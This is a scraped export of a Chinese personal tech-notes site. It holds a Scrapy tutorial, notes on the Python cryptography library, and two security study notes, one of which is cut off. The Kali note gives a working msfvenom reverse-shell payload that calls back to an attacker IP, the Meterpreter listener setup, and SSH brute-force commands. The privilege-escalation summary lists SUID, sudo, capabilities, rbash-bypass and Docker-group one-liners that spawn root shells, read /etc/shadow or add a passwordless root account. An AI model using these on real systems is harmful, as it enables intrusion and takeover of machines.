scrapy startproject mySpider 输出: (.venv) yanque@mbp16 StudyScrapy % scrapy startproject mySpider New Scrapy project 'mySpider', using template directory '/Users/yanque/Project/Code/Pycharm/StudyScrapy/.venv/lib/python3.11/site-packages/scrapy/templates/project', created in: /Users/yanque/Project/Code/Pycharm/StudyScrapy/mySpider scons sconsign screen script scutil You can start your first spider with: cd mySpider scrapy genspider example example.com 查看目录结构: (.venv) yanque@mbp16 StudyScrapy % tree mySpider mySpider ├── mySpider │ ├── __init__.py │ ├── items.py │ ├── middlewares.py │ ├── pipelines.py │ ├── settings.py │ └── spiders │ └── __init__.py └── scrapy.cfg 2 directories, 7 files 这些文件分别是: scrapy.cfg: 项目的配置文件。 mySpider/: 项目的Python模块，将会从这里引用代码。 mySpider/items.py: 项目的目标文件。 middlewares.py: 中间件文件 mySpider/pipelines.py: 项目的管道文件。 mySpider/settings.py: 项目的设置文件。 mySpider/spiders/: 存储爬虫代码目录。 明确目标(mySpider/items.py) 我们打算抓取 黑马 网站里的所有讲师的姓名、职称和个人信息。 打开 mySpider 目录下的 items.py。 Item 定义结构化数据字段，用来保存爬取到的数据，有点像 Python 中的 dict，但是提供了一些额外的保护减少错误。 可以通过创建一个 scrapy.Item 类， 并且定义类型为 scrapy.Field 的类属性来定义一个 Item（可以理解成类似于 ORM 的映射关系）。 接下来，创建一个 ItcastItem 类，和构建 item 模型（model）: import scrapy class ItcastItem(scrapy.Item): head = scrapy.Field() name = scrapy.Field() level = scrapy.Field() desc = scrapy.Field() 制作爬虫(spiders/itcastSpider.py) 爬数据 在 mySpider/spiders 目录下输入命令: scrapy genspider itcast \"itcast.cn\" 将在 mySpider/spiders 目录下创建一个名为 itcast 的爬虫，并指定爬取域的范围. mySpider/spiders 目录里的 itcast.py，默认代码: import scrapy class ItcastSpider(scrapy.Spider): name = \"itcast\" allowed_domains = [\"itcast.cn\"] start_urls = ( 'http://www.itcast.cn/', ) def parse(self, response): pass 注解 可以由我们自行创建itcast.py并编写上面的代码，只不过使用命令可以免去编写固定代码的麻烦 要建立一个Spider， 你必须用scrapy.Spider类创建一个子类，并确定了三个强制的属性 和 一个方法。 name = \"\" 这个爬虫的识别名称，必须是唯一的，在不同的爬虫必须定义不同的名字。 allow_domains = [] 是搜索的域名范围，也就是爬虫的约束区域，规定爬虫只爬取这个域名下的网页，不存在的URL会被忽略。 新版本貌似已经废弃 start_urls = () 爬取的URL元祖/列表。爬虫从这里开始抓取数据，所以，第一次下载的数据将会从这些urls开始。其他子URL将会从这些起始URL中继承性生成。 或者不定义 start_urls, 直接重写 start_requests def start_requests(self): urls = [ \"https://quotes.toscrape.com/page/1/\", \"https://quotes.toscrape.com/page/2/\", ] for url in urls: yield scrapy.Request(url=url, callback=self.parse) 注意 start_requests 返回结果需要是一个生成器 parse(self, response) 解析的方法，每个初始URL完成下载后将被调用，调用的时候传入从每一个URL传回的Response对象来作为唯一参数， 主要作用如下： 负责解析返回的网页数据(response.body)，提取结构化数据(生成item) 生成需要下一页的URL请求。 将start_urls的值修改为需要爬取的第一个url: start_urls = (\"http://www.itcast.cn/channel/teacher.shtml\",) 修改parse()方法: from scrapy.http import Request, Response def parse(self, response: Response): filename = \"teacher.html\" with open(filename, 'w') as f: f.write(response.body.decode('utf-8')) 然后运行一下这个爬虫看看，在 mySpider 目录下执行( 一定要确定正确的根目录 ): cd mySpider; scrapy crawl itcast 可以看到 mySpider 下生成了爬取的 teacher.html 发生了什么? 不管是否重新定义 start_requests , start_requests 的返回结果都是 scrapy.Request 对象的生成器 对于每一个生成器的 url, 都会调用 parse 方法, 处理拿到的数据 另外, start_requests 返回的 scrapy.Request 默认回调就是 parse shell工具 最开始可以使用 /docs/后端/python/python三方库/Scrapy/Scrapy shell 工具: scrapy shell 'http://www.itcast.cn/channel/teacher.shtml' 来启动一个交互式终端 可以选择使用了指定 CSS 标签, 示例寻找 <title> 元素: >>> response.css(\"title\") [<Selector query='descendant-or-self::title' data='<title>师资力量|讲师介绍_黑马程序员</title>'>] >>> 输出结果是一个 SelectorList 对象, 代表所有查询到的元素的列表 查看所有: >>> response.css(\"title\").getall() ['<title>师资力量|讲师介绍_黑马程序员</title>'] 只需要文本: >>> response.css(\"title::text\").getall() ['师资力量|讲师介绍_黑马程序员'] 只获取第一个元素的文本: >>> response.css(\"title::text\").get() '师资力量|讲师介绍_黑马程序员' 等价于: >>> response.css(\"title::text\")[0].get() '师资力量|讲师介绍_黑马程序员' 注解 使用索引的方式, 如果没有就报错索引越界, 所以还是直接用 get 获取第一个好点 还支持使用 re 进行正则: >>> response.css(\"title::text\").re(r\".*\") ['师资力量|讲师介绍_黑马程序员', ''] >>> >>> response.css(\"title::text\").re(r\"\\w*\") ['师资力量', '', '讲师介绍_黑马程序员', ''] >>> >>> response.css(\"title::text\").re(r\"(\\w*)_(\\w*)\") ['讲师介绍', '黑马程序员'] 还可以从浏览器打开缓存的 HTML 页面: >>> view(response) True 原始数据解析 我们可以研究下之前拿到的 teacher.html , 可以看到, 老师信息都在一个 div 里面: 结构大概如下: <div class=\"tea_con\"> <div class=\"tea_txt\"> 第一部分老师信息的 li 列表 </div> <div class=\"tea_txt\"> 第二部分老师信息的 li 列表 </div> <div class=\"tea_txt\"> 第三部分老师信息的 li 列表 </div> ... </div> 我们现在使用 CSS 选择器获取最外层: >>> response.css(\"div.tea_con\") [<Selector query=\"descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_con ')]\" data='<div class=\"tea_con\">\\n\\t\\t<div class=\"t...'>] >>> 定位下一层(输出太多就不全贴): >>> response.css(\"div.tea_con div.tea_txt\") [<Selector query=\"descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_con ')]... 这个时候获取的结果列表是所有的: <div class=\"tea_txt\">... <div class=\"tea_txt\">... <div class=\"tea_txt\">... ... 继续, 如何获取每一部分的信息, 先观察html: <ul> <li> <img src='images/teacher/javaee/20210126133739杜老师_讲师.jpg'> <div class=\"li_txt\"> <h3>杜老师</h3> <h4>高级讲师</h4> <p>15年软件开发与教学经验，熟练掌握MySQL、Redis、SSM框架、Dubbo、ZooKeeper、SpringBoot、SpringCloud等技术,主持与参与过市级财务系统，企业管理等系统开发。熟悉分布式技术，了解微服务架构，具备多个行业项目产品开发与管理经验，对培训有深刻的理解和把握。</p> </div> </li> <li> <img src='images/teacher/javaee/2020080614171120200701111719姜涛.jpg'> <div class=\"li_txt\"> <h3>姜老师</h3> <h4>高级讲师</h4> <p>擅长Java EE企业级应用，十余年项目管理经验，曾担任开发工程师，架构师等重要角色。主导多个大型项目的架构设计、管理等工作。在互联网项目领域具备丰富的经验，精通微服务架构，擅长解决高并发，亿级数据量等架构设计，拥有广泛的技术面与实践经验。</p> </div> </li> ... </ul> 到这里其实就不用考虑外部的循环了, 可以直接定位到每一个li标签: response.css(\"div.tea_con div.tea_txt ul li\") 先只考虑第一个(因为li内部结构一致, 后面的迭代就行): >>> response.css(\"div.tea_con div.tea_txt ul li\")[0] <Selector query=\"descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_con ')]/descendant-or-self::*/div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_txt ')]/descendant-or-self::*/ul/descendant-or-self::*/li\" data='<li>\\n\\t\\t\\t\\t\\t<img src=\"images/teacher/ja...'> >>> >>> t1 = response.css(\"div.tea_con div.tea_txt ul li\")[0] >>> 获取老师照片: >>> t1.css(\"img::attr(src)\").get() 'images/teacher/javaee/20210126133739杜老师_讲师.jpg' 获取老师名字: >>> t1.css(\"h3::text\").get() '杜老师' 级别: >>> t1.css(\"h4::text\").get() '高级讲师' 介绍: >>> t1.css(\"p::text\").get() '15年软件开发与教学经验，熟练掌握MySQL、Redis、SSM框架、Dubbo、ZooKeeper、SpringBoot、SpringCloud等技术,主持与参与过市级财务系统，企业管理等系统开发。熟悉分布式技术，了解微服务架构，具备多个行业项目产品开发与管理经验，对培训有深刻的理解和把握。' >>> 那么对于所有的老师, 可以简单的循环处理: >>> data = [] >>> from collections import namedtuple >>> Teacher = namedtuple(\"Teacher\", [\"image\", \"name\", \"level\", \"desc\"]) >>> for t in response.css(\"div.tea_con div.tea_txt ul li\"): ... img = t.css(\"img::attr(src)\").get() ... name = t.css(\"h3::text\").get() ... level = t.css(\"h4::text\").get() ... desc = t.css(\"p::text\").get() ... data.append(Teacher(img, name, level, desc)) 就获取到了所有数据, 可以简单看看结果: >>> data[0] Teacher(image='images/teacher/javaee/20210126133739杜老师_讲师.jpg', name='杜老师', level='高级讲师', desc='15年软件开发与教学经验，熟练掌握MySQL、Redis、SSM框架、Dubbo、ZooKeeper、SpringBoot、SpringCloud等技务架构，具备多个行业项目产品开发与管理经验，对培训有深刻的理解和把握。') >>> data[1] Teacher(image='images/teacher/javaee/2020080614171120200701111719姜涛.jpg', name='姜老师', level='高级讲师', desc='擅长Java EE企业级应用，十余年项目管理经验，曾担任开发工程师，架构师等重要角色。主导多个大型项构设计，拥有广泛的技术面与实践经验。') >>> data.__len__() 179 所以 parse 可以这么写: def parse(self, response: Response): # filename = \"teacher.html\" # with open(filename, 'w') as f: # f.write(response.body.decode('utf-8')) from collections import namedtuple Teacher = namedtuple(\"Teacher\", [\"image\", \"name\", \"level\", \"desc\"]) data: [Teacher] = [] for t in response.css(\"div.tea_con div.tea_txt ul li\"): img = t.css(\"img::attr(src)\").get() name = t.css(\"h3::text\").get() level = t.css(\"h4::text\").get() desc = t.css(\"p::text\").get() data.append(Teacher(img, name, level, desc)) with open(\"teacher.json\", \"w\") as f: json.dump({\"data\": data}, f, ensure_ascii=False, indent=4) 执行下看看结果: cd mySpider; scrapy crawl itcast teacher.json内容(部分): 解析数据转给框架 还是改 parse: def parse(self, response: Response): for t in response.css(\"div.tea_con div.tea_txt ul li\"): img = t.css(\"img::attr(src)\").get() name = t.css(\"h3::text\").get() level = t.css(\"h4::text\").get() desc = t.css(\"p::text\").get() yield { \"head\": img, \"name\": name, \"level\": level, \"desc\": desc, } 这个时候再启动就可以看到数据打印在日志了, 太多我就不放了. 将框架获取到的数据导出到 t.json: scrapy crawl itcast -O t.json 效果: 还可使用 -o t.jsonl 仅新增, 详细参考 crawl <CmdCrawl> 如果需要或许的数据是链接比如 href (即动态的): <ul class=\"pager\"> <li class=\"next\"> <a href=\"/page/2/\">Next <span aria-hidden=\"true\">&rarr;</span></a> </li> </ul> 可以在parse后增加后续的爬取: def parse(...): ... next_page = response.css(\"li.next a::attr(href)\").get() if next_page is not None: next_page = response.urljoin(next_page) yield scrapy.Request(next_page, callback=self.parse) 注解 urljoin 提供了自动拼接到上一层, 从而转换为绝对路径的功能 或者也可以直接通过 response.follow 使用相对路径: for href in response.css(\"ul.pager a::attr(href)\"): yield response.follow(href, callback=self.parse) 实际对于 a 标签, 提供了自动支持找href的功能: for a in response.css(\"ul.pager a\"): yield response.follow(a, callback=self.parse) 甚至可以直接一次性多匹配: anchors = response.css(\"ul.pager a\") yield from response.follow_all(anchors, callback=self.parse) # 简单点就是 yield from response.follow_all(css=\"ul.pager a\", callback=self.parse) XPath支持 XPath 参考 /docs/后端/python/教程/xpath/index 除了 上面的使用 CSS选择器来做数据提取, Scrapy的 选择器 也支持 XPath 对象: >>> response.xpath(\"//title\") [<Selector query='//title' data='<title>师资力量|讲师介绍_黑马程序员</title>'>] 返回的也是 API/SelectorList 对象: >>> response.xpath(\"//title\").get() '<title>师资力量|讲师介绍_黑马程序员</title>' 注解 举例, 如果有一个 div: <div class=\"quote\"></div> 如何正确的选择此节点: response.css(\"div.quote\") 举例, 还是上面的老师信息获取: >>> response.xpath(\"//div[@class='tea_con']\") [<Selector query=\"//div[@class='tea_con']\" data='<div class=\"tea_con\">\\n\\t\\t<div class=\"t...'>] 同样的, parse 文件 存储内容 （pipelines.py） 设计管道存储爬取内容 如果只是简单的获取某些数据, 那么上面的内容已经足够. 但若想处理更复杂的事情, 那么就需要使用到 pipelines 参考: Scrapy Tutorial","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-use.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-use.html"},{"title":"cryptography","text":"项目地址: https://github.com/pyca/cryptography/ 官网文档: https://cryptography.io/en/latest/ 翻译就是 密码学 密码学可研究下101: CRYPTO101 一个新的标准Python加密库 为什么建立一个新的Python密码库？ 现有的Python密码库，如M2Crypto, PyCrypto, or PyOpenSSL，存在一些问题： 缺少PyPy和Python 3支持 缺少维护 使用了差评的算法实现（例如旁路攻击side-channel attacks） 缺少高级（易于使用）的APIs 缺少AES-GCM和HKDF等算法 经不住测试 错误百出的APIs 特性 Cyptography密码库包括两个部分：cryptographic recipes and primitives.这是本密码库非常有意思的地方，很多现有的其他密码库并没有这个特点。cryptographic recipes，直接翻译为密码学菜谱。其实个人也一时找不出合适的词语来解释。cryptographic primitives，即为密码学原语，也就是基本的密码概念，如加密、签名、Hash等算法。但是直接使用密码学原语容易出错，在实际应用中无法保证安全性。基于这一点，该库对密码学原语进行了安全集成，形成了更高层次的\"密码学菜谱\"。这么说吧，密码学原语像是做菜的原材料，对于初学者来说，虽然手里都有，但是不懂得如何去制作；如果有了\"密码学菜谱\"，初学者直接按照说明，制作菜肴就可以了。 安装: pip install cryptography 用例 Cryptography密码库实现了一个集成的对称密码函数，称之为Fernet。它可以保证信息无法被篡改和破解。 加解密 加解密的例子: >>>from cryptography.fernet import Fernet >>>key = Fernet.generate_key() # 产生加密所需的密钥key，它通过调用相关函数而产生随机数。 >>>key Out[3]: 'x10qxCPeNGhddcP5fASy5XB1JedmwXJeAF1gS-zeuvw=' >>>f = Fernet(key) # 实例化Fernet >>>f Out[6]: <cryptography.fernet.Fernet at 0xb969668> >>>token = f.encrypt(b\"my deep dark secret\") # 加密消息 >>>token Out[8]: 'gAAAAABYnKtVmGpMe6rM39jzSYFTlBxjXBwbCix8nZ2DBzsFh6BVzwtrYx0qDyohXQ3xqj232_DJsdN8bR9sMUQbEcPenZD-MAWqR-YkOdg7prc9e0QnMA4=' >>>f.decrypt(token) # 加密消息 Out[9]: 'my deep dark secret' 密钥轮换（Key rotation） 密钥轮换（Key rotation）的例子 MultiFernet的输入为多个key的列表，它总是以第一个密钥加密消息，而在解密时，依次使用每个密钥。 Key rotation机制使得替代旧的密钥变得容易。 个人可以将新的密钥添加在key列表的第一个，开始加密新的消息，而在解密以前的密文后，如果旧的密钥不再需要则丢弃: >>>from cryptography.fernet import Fernet, MultiFernet >>>key1 = Fernet(Fernet.generate_key()) >>>key2 = Fernet(Fernet.generate_key()) >>>f = MultiFernet([key1, key2]) >>>token = f.encrypt(b\"Secret message!\") >>>token Out[6]: 'gAAAAABYnKzqNxRAbwP6hMMGmB4eIBhiAR2oVG136Dpive8AhNBdtjwKKiOj_Zaxv8e1dHWp1_WpvktTCT5lRnm9ZnBIK4AoMw==' >>>f.decrypt(token) Out[7]: 'Secret message!' >>>key3 = Fernet(Fernet.generate_key()) >>>f = MultiFernet([key3, key1, key2]) >>>f.decrypt(token) Out[10]: 'Secret message!' 参考: https://zhuanlan.zhihu.com/p/25168804","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-cryptography.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-cryptography.html"},{"title":"Kali漏洞分析利用","text":"经过 /docs/安全/学习记录/Kali信息收集 收集到的资产 联系人、联系方式 域名和子域名 IP、端口信息 操作系统、应用程序、框架、数据库、版本信息 网站文件（目录扫描） 搜索引擎和网络空间测绘收集到的信息 ... 漏洞数据库 CVE (Common Vulnerabilities & ExposUres ） (通用漏洞共享平台): https://cve.mitre.org/ https://www.cvedetails.com/ https://www.cnvd.org/cn/ https://nox.qianxin.com/vulnerability 国内的: # 国家 https://www.cnvd.org.cn/ # 奇安信 https://ti.qianxin.com/ https://ti.qianxin.com/vulnerability/ 一般漏洞编号: CVE + 年份 + 编号 如: CVE-2004-1137 漏洞利用工具集 POC: Proof Of Concept(观念验证) EXP: Exploit 利用(漏洞利用) 可用漏洞利用网站: https://www.exploit-db.com/ 相关指令: /docs/安全/kali/kali渗透专用指令/msfconsole 的 searchsploit pocsuite 注解 如果自己要做一个漏洞搜集的汇总网站, 可以github搜索: pocsuite 提供了一个基础的框架 漏洞扫描工具 商业漏洞扫描工具 Appscan Nessus OpenVAS ... 免费的 goby (红队是收费版) Burp https://github.com/k8gege/Ladon 国产的 注解 一般不允许使用漏洞扫描工具扫描线上服务, 因为会建立大量请求, 说不定就直接把你封了(同ip大量请求) 一般就内部未上线的用下 msf反弹连接 msf使用见 /docs/安全/kali/kali渗透专用指令/msfconsole 实例 生成payload, 指令详见 /docs/安全/kali/msf/msfvenom , 生成一个python版本的payload: # msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py # LHOST=攻击机IP 一般为自己本机ip(本机就是攻击机) # LPORT=攻击机端口 随便 msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.186.133 LPORT=8889 -f raw -o payload.py 攻击机生成payload 攻击机生成: ┌──(kali㉿kali)-[~/test] └─$ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.186.133 LPORT=8889 -f raw -o payload.py /usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME ... ┌──(kali㉿kali)-[~/test] └─$ ┌──(kali㉿kali)-[~/test] └─$ cat payload.py exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTg2LjEzMycsODg4OSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0])) 将payload传递到靶机 利用漏洞将生成的 payload.py 上传到目标机器 攻击机使用msf监听 指令: # 进入msf控制台 msfconsole # 使用监听模块 use exploit/multi/handler # 设置payload类型 注意跟上面生成时使用的模块要一致 set payload python/meterpreter/reverse_tcp set lhost 攻击机IP set lport 攻击机端口 exploit 实例: msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp payload => python/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set lhost 192.168.186.133 lhost => 192.168.186.133 msf6 exploit(multi/handler) > set lport 8889 lport => 8889 msf6 exploit(multi/handler) > msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.186.133:8889 当靶机触发payload时候: [*] Sending stage (40168 bytes) to 192.168.186.129 [*] Meterpreter session 1 opened (192.168.186.133:8889 -> 192.168.186.129:53686) at 2024-02-25 21:56:55 +0800 meterpreter > 即获取到 192.168.186.129 的反弹shell 执行个 dir 指令: meterpreter > dir Listing: D:\\Project\\DevTools\\phpStudy_64\\phpstudy_pro\\WWW\\test ============================================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 503 fil 2024-02-25 21:53:44 +08 pl.py 00 meterpreter > Burp Suite爆破web密码 bp拦截成功后将其转入 Intruder 然后选择 Sniper (狙击手) 模式即可 设置好 Payload 后点击 Start attack 开始攻击 效果 可以看出当密码正确时候, 响应长度可以作为判断是否成功标志(还是得看情况) Hydra爆破Linux密码 相关指令: /docs/安全/kali/kali渗透专用指令/hydra /docs/安全/kali/kali渗透专用指令/medusa /docs/安全/kali/kali渗透专用指令/msfconsole 三种工具: hydra -L username.txt -P password.txt 192.168.142.66 ssh medusa -M ssh -h 192.168.142.66 -u root -P password.txt msfconsole use auxiliary/scanner/ssh/ssh_login set RHOSTS 192.168.142.66 set PASS_FILE password.txt set USER_FILE username.txt exploit sqlmap渗透 工具 /docs/安全/kali/kali渗透专用指令/sqlmap","tags":"安全","url":"/yq-doc-source-docs-Safety-Study-record-Kali-vulnerability-analysis-and-utilization.html","loc":"/yq-doc-source-docs-Safety-Study-record-Kali-vulnerability-analysis-and-utilization.html"},{"title":"提权总结","text":"sudo/suid提权 suid涉及到linux的s权限位: /docs/操作系统/linux/概念性/linux下文件权限位 sudo可以其他用户执行, 可见: /docs/操作系统/linux/linux指令/sudo 一般来说, 就是利用某些具有s位权限的指令, 获取到root的权限 查找具有suid权限文件: find / -perm -u=s 2>/dev/null 查看哪些命令能被sudo: sudo -l 接下来列出具体可用于提权的一些指令 nmap nmap: echo \"os.execute('/bin/bash')\" > ./shell nmap --script=shell suid-find find命令自带-exec参数, 可以执行命令, 若find有suid权限, 那么使用exec相当于直接提权到root: # find / -exec command find /path -exec {} \\; suid-vim vim有了suid就可以任意文件读取了 同时也可以输入: :shell 来获取root shell bash 开启一个新shell, suid的话自然是开启root shell: bash -p less/more 和vim差不多, 任意文件读取, 同时也可以输入: !command 进行提权到root exim exim在特定版本下会有suid提权 这里没懂 利用环境变量 如果我们找到一个suid权限的程序, 但是我们无法完成suid提权, 就可以试试搭配环境变量进行提权. 这个提权方法的思想是: 文件具有 suid 权限 文件内容有 system 函数调用, 且此调用未指定路径 用户有权修改自己环境变量 就可以通过劫持system函数里调用的脚本文件, 使其指向我们环境变量里自行创建的一个同名脚本文件, 那么自行创建的同名脚本文件就能以root权限运行了, 如果这个脚本文件里的命令是/bin/bash, 那么就相当于提权了. 例 对于被攻击者, 创建一个具有以上条件的文件: ┌──(root㉿3675b5ebb8ce)-[~] └─# cat demo.c # include <unistd.h> # include <stdlib.h> void main (){ setuid(0); setgid(0); system(\"ps\"); } ┌──(root㉿3675b5ebb8ce)-[~] └─# gcc demo.c -o do_ps ┌──(root㉿3675b5ebb8ce)-[~] └─# chmod u+s do_ps ┌──(root㉿3675b5ebb8ce)-[~] └─# ls -lh do_ps -rwsr-xr-x 1 root root 69K Mar 4 14:44 do_ps ┌──(root㉿3675b5ebb8ce)-[~] └─# ./do_ps PID TTY TIME CMD 9 pts/1 00:00:00 bash 31 pts/1 00:00:00 do_ps 32 pts/1 00:00:00 sh 33 pts/1 00:00:00 ps ┌──(root㉿3675b5ebb8ce)-[~] └─# mv do_ps /home/yanque/test/ 对于攻击者而言: ┌──(yanque㉿3675b5ebb8ce)-[~] └─$ find / -perm -u=s -type f 2>/dev/null /home/yanque/test/do_ps ┌──(yanque㉿3675b5ebb8ce)-[~] └─$ test/do_ps PID TTY TIME CMD 9 pts/1 00:00:00 bash 51 pts/1 00:00:00 su 67 pts/1 00:00:00 do_ps 68 pts/1 00:00:00 sh 69 pts/1 00:00:00 ps 发现返回了ps命令的结果, 可此猜测这个文件内部 有 system(\"ps\"); 类似这样的代码. 测试... 本地测试的时候 export 一直失败... ┌──(yanque㉿3675b5ebb8ce)-[~/test] └─$ export $PATH=\"/home/yanque/test:$PATH\" -bash: export: `/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games=/home/yanque/test:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games': not a valid identifier 遂放弃 然后进行以下尝试: cd /tmp echo \"/bin/bash\" > ps export $PATH=/tmp:$PATH # 需要修改自身环境变量的权限, 但基本上都有这个权限 chmod 777 ./ps # 没这条命令会导致提权失败 cd ~ test/do_ps # 提权成功 rbash绕过 rbash, 是出于安全性考虑的一个功能受限的bash, 他的限制性可能会有如下. cd 切换目录 含有斜杠 / 的命令, 譬如 /bin/sh 设置 PATH ENV 等环境变量 使用 > < 进行重定向 binary 的运行. 通常 root 用户会手动创建 /bin/binary_file -> /home/rbash_user/bin/binary_file 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 echo $SHELL, 可以获取当前环境是否是 rbash. 使用scp发送自己的bash进行绕过: # 发送到当前用户的环境变量路径下 scp /usr/bin/bash user@ip:/home/test/bash # 执行 bash -p 同时这里也可以想到, 很多命令如man,git config help,more,less,vim,vi,ftp,gdb等, 都有自己的shell, 只需在他们各自的shell中执行/bin/sh即可进入bash界面, 一般都是在shell键入: !/bin/sh 来 bypass rbash vim 如对于vim, 可执行以下命令绕过: :set shell=/bin/bash :shell find 对于find来说: find -exec /bin/bash \\; cp 对于cp: # 查看当前用户环境变量 export -p # 然后使用cp 将 /usr/bin 下文件复制过来即可 编程语言绕过 python: python -c \"import os;os.system('/bin/bash')\" php: # php -a 进入php shell exec(\"/bin/bash\"); perl: perl -e 'exec \"/bin/sh\";' ruby: ruby -e 'exec \"/bin/bash\"' ssh 对于ssh, 通过ssh链接当前IP的当前用户并启动/bin/bash: ssh username@Ip -t \"/bin/bash\" 内核提权 先查看系统内核版本: uname -a 然后找exp打 passwd和shadow 明文密码 /etc/passwd 默认所有用户可读, 但只有root可写. /etc/passwd里的用户口令往往以x代替, 其加密后的密码会存入/etc/shadow里面, /etc/shadow默认只有root可读. 但是有小概率情况, 明文密码就直接出现在/etc/passwd了, 如果有这个情况且root密码暴露在了passwd里, 那么就可以轻而易举提权了 passwd 可写 如果/etc/passwd 我们当前用户可写, 可以直接把root的密码改成一个明文密码, 从而达到提权目的 爆破shadow 如果/etc/shadow 可读, 我们可以用hashcat或者john暴力破解shadow文件 计划任务(crontab) 文件重写 计划任务由crontab管理, 非root用户是无法列出root用户的计划任务的, 但我们可以列出/etc的系统任务, 系统任务默认是root权限运行的: ls -l /etc/cron* 如果我们有幸有权限能更改其中一个任务指定的脚本, 我们就可以往脚本里添加如反弹shell等指令, 从而提权 环境变量劫持 查看定时任务 发现定义了诸多环境变量, 如果其任务有未指定绝对路径的指令, 如: 17 * * * * root shell.sh 而且我们在其环境变量路径中可以进行写入操作, 那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持 比如我们在/sbin 写入一个 反弹shell功能的shell.sh, 那么就可以造成提权 密码查找 这个提权技术说白了, 就是去到处翻密码 可以通过以下命令, 指定关键字, 在所有文件中搜索内容中有关键字的文件: grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null find . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\; 查找十分钟内更改过的文件: find / -mmin -10 2>/dev/null | grep -Ev \"&#94;/proc\" (不显示&#94;/proc文件或文件夹) capabilities capabilities 是linux2.2后出现的产物, 它的出现一定程度上弥补了suid这种粗糙的权限管理机制, 但是capabilities 自身也有造成提权的安全隐患 简介 capabilities 把root的权限细分了, 可以分别启用或者禁用. euid 见 /docs/操作系统/linux/概念性/linux下文件权限位 下 文件权限的s位和t位的理解 小节 在进行特权操作的时候, 如果 euid 不是root, 那么系统就会检查是否具有执行特权操作的对应capabilities , 并以此为凭据决定特权操作是否能被执行. 如下是一些常见的特权操作及其对应capabilities 改变文件的所属者(chown()) CAP_CHOWN 向进程发送信号(kill() signal()) CAP_KILL 改变进程的uid(setuid() setreuid() setresuid()等) CAP_SETUID trace进程(ptrace()) CAP_SYS_PTRACE 设置系统时间(settimeofday() stime()等) CAP_SYS_TIME 忽略文件读及目录搜索的DAC访问限制 CAP_DAC_READ_SEARCH 关于capabilities的管理工具有如下: getcap setcap capsh filecap getcap getcap 用于查询capabilities, setcap用于设置capabilities, capsh用于查当前shell进程的capabilities, filecap既能设置又能查询. 我们可以通过以下指令搜索设置了capabilities的可执行文件: getcap -r / 2>/dev/null 实操 - 通过 cap_setuid cap_setuid 可以设置当前用户的euid, 我们可以通过此选项来进行一些提权. 以python为例: ./python3.8 = cap_setuid+eip 现python3.8 有cap_setuid权限, 那么我们可以用以下指令进行提权: python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' 类似的有很多 perl: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' gdb: gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit php: php -r \"posix_setuid(0); system('/bin/sh');\" python: python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' rvim (需要支持python3模块) rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' vim (需要支持python3模块, vim --version 查询, 是否支持py3) vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' 实操 - 通过 CAP_DAC_READ_SEARCH cap_dac_read_search 可以绕过文件的读权限检查以及目录的读/执行权限的检查. 利用此特性我们可以读取系统中的敏感信息. 如果tar有此权限, 我们可以通过此来查看敏感文件内容: tar cvf shadow.tar /etc/shadow //创建压缩文件 tar -xvf shadow.tar //解压缩 cd etc //进入解压缩的目录 chmod +r shadow //赋予读权限 cat shadow | grep root //查看shadow文件的内容 Docker Docker用户组提权 如果我们拿到了一个Docker用户组的用户权限, 那么我们可以很轻松地完成提权 首先我们执行如下命令: docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh 然后在其中的/etc/passwd中写入一个root权限用户（这里直接无密码了） root2::0:0::/root:/bin/bash 然后退出来, 直接尝试: su root2 NFS NFS 是一个用来共享目录的东西, 但若配置权限不当则会引发安全问题 no_root_squash 我们 cat /etc/exports 如果有 no_root_squash 字样, 